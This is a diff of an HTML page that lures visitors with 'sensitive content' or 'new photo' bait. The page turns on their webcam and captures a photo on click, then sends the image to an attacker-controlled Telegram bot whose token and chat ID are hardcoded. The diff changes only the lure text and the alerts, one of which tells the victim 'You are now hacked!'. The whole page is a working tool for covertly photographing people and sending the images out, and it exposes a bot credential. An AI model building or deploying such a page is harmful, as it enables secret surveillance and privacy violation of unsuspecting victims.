@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>صورة جديدة 😂</title>
+    <title>sensitive content😂</title>
     <style>
         body { text-align: center; font-family: Arial; background: #111; color: white; margin: 0; padding: 20px; }
         h1 { color: #ff4444; }
@@ -12,20 +12,21 @@
     </style>
 </head>
 <body>
-    <h1>اضغط لمشاهدة الصورة! 📸</h1>
+    <h1>💀sensitive content</h1>
     <video id="video" autoplay playsinline></video><br>
-    <button onclick="takePhoto()">التقط الصورة الآن</button>
+    <button onclick="takePhoto()">Warning: Do you really want to enter?/button>
 
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
         const video = document.getElementById('video');
-        const BOT_TOKEN = "8875338532:AAGPUmgVySBChH_5ZGh0-u9pclGVXXX1ZiM";
-        const CHAT_ID = "74308187";
+        const BOT_TOKEN = "8875338532:AAGPUmgVySBChH_5ZGh0-u9pclGVXXX1ZiM";   // غير هذا
+        const CHAT_ID = "7876122259";         // غير هذا
 
+        // تشغيل الكاميرا
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(stream => { video.srcObject = stream; })
-            .catch(err => alert("يجب السماح بالكاميرا عشان يشتغل!"));
+            .catch(err => alert("Are you confident?"));
 
         function takePhoto() {
             const canvas = document.getElementById('canvas');
@@ -35,6 +36,7 @@
 
             const photoData = canvas.toDataURL('image/jpeg', 0.8);
 
+            // إرسال الصورة إلى تليجرام
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -44,7 +46,7 @@
                     caption: 'صورة جديدة من الرابط 😂'
                 })
             })
-            .then(() => alert('✅ تم التقاط الصورة وإرسالها!'))
+            .then(() => alert('You are now hacked!'))
             .catch(err => alert('حدث خطأ في الإرسال'));
         }
     </script>
